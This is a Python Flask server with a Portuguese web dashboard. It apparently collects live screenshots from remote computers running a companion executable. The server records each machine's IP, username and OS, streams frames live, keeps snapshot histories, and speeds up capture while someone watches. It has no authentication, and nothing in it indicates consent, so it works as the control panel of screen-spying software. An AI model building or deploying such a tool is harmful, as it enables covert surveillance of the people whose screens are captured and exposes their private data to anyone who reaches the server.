import os, time, threading
from collections import deque
from flask import Flask, Response, request, jsonify

app = Flask(__name__)

LIVE = {}
lock = threading.Lock()

WATCH_TIMEOUT = 4     # segundos sem ninguem olhando = cliente desacelera
SNAP_INTERVAL = 30    # guarda uma foto do historico a cada X segundos
MAX_SNAPS = 40

PAINEL = """<!doctype html>
<html lang="pt-br">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Painel</title>
<style>
  * { box-sizing:border-box; }
  body { margin:0; background:#0b0d10; color:#e7e9ee;
         font:14px/1.5 system-ui,-apple-system,Segoe UI,sans-serif; }
  header { padding:14px 18px; border-bottom:1px solid #1e232b; display:flex; gap:10px; align-items:center; }
  h1 { font-size:15px; margin:0; font-weight:600; }
  .dot { width:8px; height:8px; border-radius:50%; background:#22c55e; }
  #grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(300px,1fr)); gap:14px; padding:18px; }
  .card { background:#12161c; border:1px solid #1e232b; border-radius:14px; overflow:hidden; }
  .card img { width:100%; display:block; aspect-ratio:4/3; object-fit:cover; background:#000; cursor:zoom-in; }
  .meta { padding:11px 13px; }
  .nome { font-weight:600; }
  .sub { color:#8b93a1; font-size:12px; margin-top:2px; }
  .row { display:flex; gap:8px; margin-top:9px; }
  .row button, .row a { flex:1; background:#1c2229; color:#e7e9ee; border:1px solid #262d36;
      border-radius:8px; padding:7px; font:inherit; font-size:12px; cursor:pointer;
      text-align:center; text-decoration:none; }
  .off { opacity:.45; }
  #vazio { padding:36px 18px; color:#8b93a1; }
  #over { position:fixed; inset:0; background:#000; display:none; z-index:99; cursor:zoom-out; }
  #over img { width:100%; height:100%; object-fit:contain; }
</style>
</head>
<body>
<header><span class="dot"></span><h1>Painel</h1></header>
<div id="grid"></div>
<div id="vazio">Nenhuma maquina conectada ainda. Se o exe ja esta rodando, espere alguns segundos.</div>
<div id="over"><img id="overimg" alt=""></div>
<script>
var montados = {};

function olhar(nome, img, ms) {
  img.onload = function() { setTimeout(function() { pegar(nome, img); }, ms); };
  img.onerror = function() { setTimeout(function() { pegar(nome, img); }, 1000); };
  pegar(nome, img);
}
function pegar(nome, img) {
  img.src = '/foto/' + nome + '?t=' + Date.now();
}
function abrir(nome) {
  var o = document.getElementById('over');
  var i = document.getElementById('overimg');
  o.style.display = 'block';
  olhar(nome, i, 100);
}
document.getElementById('over').onclick = function() {
  this.style.display = 'none';
  document.getElementById('overimg').src = '';
};
function montar(m) {
  var d = document.createElement('div');
  d.className = 'card';
  d.innerHTML =
    '<img alt="">' +
    '<div class="meta">' +
      '<div class="nome"></div>' +
      '<div class="sub s1"></div>' +
      '<div class="sub s2"></div>' +
      '<div class="row"><button class="b1">tela cheia</button>' +
      '<a class="b2" target="_blank">historico</a></div>' +
    '</div>';
  var img = d.querySelector('img');
  img.onclick = function() { abrir(m.nome); };
  d.querySelector('.b1').onclick = function() { abrir(m.nome); };
  d.querySelector('.b2').href = '/snaps/' + m.nome;
  olhar(m.nome, img, 400);
  return d;
}
function atualizar(d, m) {
  d.querySelector('.nome').textContent = m.nome;
  d.querySelector('.s1').textContent = m.ip + ' - ' + m.user + ' - ' + m.os;
  d.querySelector('.s2').textContent = 'visto ha ' + m.idade + 's - ' + m.snaps + ' fotos';
  d.classList.toggle('off', !m.online);
}
async function tick() {
  var r = await fetch('/api/lista');
  var lista = await r.json();
  var grid = document.getElementById('grid');
  document.getElementById('vazio').style.display = lista.length ? 'none' : 'block';
  var vistos = {};
  lista.forEach(function(m) {
    vistos[m.nome] = 1;
    if (montados[m.nome]) { atualizar(montados[m.nome], m); }
    else { var c = montar(m); atualizar(c, m); grid.appendChild(c); montados[m.nome] = c; }
  });
  Object.keys(montados).forEach(function(n) {
    if (!vistos[n]) { montados[n].remove(); delete montados[n]; }
  });
}
tick();
setInterval(tick, 5000);
</script>
</body>
</html>"""

HIST = """<!doctype html><html lang="pt-br"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>historico</title>
<style>body{margin:0;background:#0b0d10;color:#e7e9ee;font:14px system-ui,sans-serif}
h1{font-size:15px;padding:14px 18px;margin:0;border-bottom:1px solid #1e232b}
.g{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px;padding:18px}
figure{margin:0;background:#12161c;border:1px solid #1e232b;border-radius:12px;overflow:hidden}
img{width:100%;display:block}figcaption{padding:8px 10px;color:#8b93a1;font-size:12px}
a{color:#7aa2f7}</style></head><body>
<h1>Historico</h1><div class="g">__ITENS__</div></body></html>"""


def maquina(nome):
    m = LIVE.get(nome)
    if m is None:
        m = {"snaps": deque(maxlen=MAX_SNAPS), "ultima": 0, "visto": 0,
             "ts": 0, "ip": "?", "user": "?", "os": "?"}
        LIVE[nome] = m
    return m


@app.route("/up/<nome>", methods=["POST"])
def up(nome):
    dados = request.get_data()
    if not dados:
        return "0"
    agora = time.time()
    with lock:
        m = maquina(nome)
        m["frame"] = dados
        m["ts"] = agora
        m["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr or "?")
        m["user"] = request.headers.get("X-User", "?")
        m["os"] = request.headers.get("X-OS", "?")
        if agora - m["ultima"] > SNAP_INTERVAL:
            m["ultima"] = agora
            m["snaps"].appendleft((agora, dados))
        assistindo = (agora - m["visto"]) < WATCH_TIMEOUT
    return "1" if assistindo else "0"


@app.route("/foto/<nome>")
def foto(nome):
    with lock:
        m = LIVE.get(nome)
        if m:
            m["visto"] = time.time()
        frame = m.get("frame") if m else None
    if not frame:
        return Response("", mimetype="image/jpeg")
    return Response(frame, mimetype="image/jpeg",
                    headers={"Cache-Control": "no-store"})


@app.route("/stream/<nome>")
def stream(nome):
    def gerar():
        while True:
            with lock:
                m = LIVE.get(nome)
                if m:
                    m["visto"] = time.time()
                    frame = m.get("frame")
                else:
                    frame = None
            if frame:
                yield (b"--frame\r\nContent-Type: image/jpeg\r\n\r\n"
                       + frame + b"\r\n")
            time.sleep(0.05)
    return Response(gerar(), mimetype="multipart/x-mixed-replace; boundary=frame")


@app.route("/api/lista")
def api_lista():
    agora = time.time()
    with lock:
        saida = []
        for nome, m in LIVE.items():
            idade = round(agora - m.get("ts", 0))
            saida.append({
                "nome": nome,
                "ip": m.get("ip", "?"),
                "user": m.get("user", "?"),
                "os": m.get("os", "?"),
                "idade": idade,
                "online": idade < 20,
                "snaps": len(m["snaps"]),
            })
        saida.sort(key=lambda x: x["idade"])
    return jsonify(saida)


@app.route("/snaps/<nome>")
def snaps(nome):
    with lock:
        m = LIVE.get(nome)
        itens = [(i, t) for i, (t, _) in enumerate(m["snaps"])] if m else []
    partes = []
    for i, t in itens:
        hora = time.strftime("%d/%m %H:%M:%S", time.localtime(t))
        partes.append('<figure><img src="/snap/' + nome + '/' + str(i) + '">'
                      '<figcaption>' + hora + '</figcaption></figure>')
    corpo = "".join(partes) or "<p style='padding:18px;color:#8b93a1'>vazio</p>"
    return HIST.replace("__ITENS__", corpo)


@app.route("/snap/<nome>/<int:i>")
def snap(nome, i):
    with lock:
        m = LIVE.get(nome)
        item = m["snaps"][i] if m and i < len(m["snaps"]) else None
    if not item:
        return Response("", status=404)
    return Response(item[1], mimetype="image/jpeg")


@app.route("/")
def index():
    return PAINEL


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8000)), threaded=True)
